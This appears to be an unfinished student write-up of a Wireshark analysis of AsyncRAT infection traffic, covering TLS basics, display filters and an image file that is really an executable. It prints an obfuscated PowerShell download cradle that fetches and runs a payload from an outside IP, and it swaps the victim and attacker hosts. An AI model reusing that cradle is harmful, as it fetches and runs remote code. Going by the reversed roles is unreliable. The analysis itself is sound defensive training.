# INTRODUCTION

Often users while browsing may download some content without verification, a general idea of HTTPs it is secured but often attackers may use it for their advantage.

site for reference: https://www.malware-traffic-analysis.net/2024/01/09/index.html

Given a pcap: https://www.malware-traffic-analysis.net/2024/01/09/2024-01-09-AsyncRAT-infection-traffic.pcap.zip

password: infected_20240109

### Acknowledgement of pcap file(and resources): 
#### Author: BRAD DUNCAN
#### Site: https://www.malware-traffic-analysis.net/


## THEORY

when browsing on net we often find sites with http and https, protocols with http are usually unsecured and it's default port is 80.
whereas, https are secured and it's default port is 443.

SSL certs is what makes http as https by encrypting the traffic/data sent.
The certificate contains vital information about server's identity in general.

#### TLS handshake:
Transport layer security is initiated by TLS handshake between server and client. (clientHello - serverHello)
here is "negotiation" between server and client:
=> Of what version TLS is going to be used,
=> Authenticating the identity of server by its TLS certificate.
=> which cipher suites going to used.
=> Generating session keys for encryption process.

#### Cipher suites:
It is a set of algorithm that specifies the details of what encryption method or keys are going to be used.
more on cipher suite: https://learn.microsoft.com/en-us/windows/win32/secauthn/cipher-suites-in-schannel

## WORKING ENVIRONMENT

To make task simpler and cleaner, we are going to use some filters:
basic

    tls.handshake.type == 1 or http.request and !(ssdp)

basic+

    tls.handshake.type == 1 or http.request and !(ssdp) or tcp.flags == 0x0002
    
basic+dns

    tls.handshake.type == 1 or http.request and !(ssdp) or tcp.flags == 0x0002 or dns

 tls.handshake.type == 1 (client Hello) 
 http.request (for filtering requests made on http)
 tcp.flags == 0x0002 (SYN flag is set)
 dns (DNS resolution)

### CHECKLIST:

Who is the victim:
45.126.209.4/222

Who is the attacker:
10.1.9.101/49708


### INVESTIGATION
#### search for server by which victim got infected:

no extension_server name found?
what does that mean?

#### certificate:
    tls.handshake.type == 11 

checking issuer:
![Screenshot 2024-07-15 135812](https://github.com/user-attachments/assets/30c44bbc-b31a-4d4f-a949-8fe62ed866d6)

checking subject:

applying filter basic for analyzing the packets sent:

content:image/jpeg
but header (magic numbers arent jpeg nor matching to any image extension)?

header mentioned here are MZ........
which is executable masquerading image

later in txt we find this:









Ofscuation has been applied for hard dectation but it simply states:


[BYTe[]];$A123='IeX(NeW-OBJeCTNeT.W';$B456='eBCLIeNT).DOWNLO';[BYTe[]];$C789='VAN(''http://45.126.209.4:222/mdm.jpg'')'.RePLACe('VAN','ADSTRING');[BYTe[]];IeX($A123+$B456+$C789)
after reverse engineeering:
NeW-OBJeCTNeT.WeBCLIeNT).DOWNLOADSTRING('http://45.126.209.4:222/mdm.jpg')


## WHAT MAY HAVE HAPPENED:
















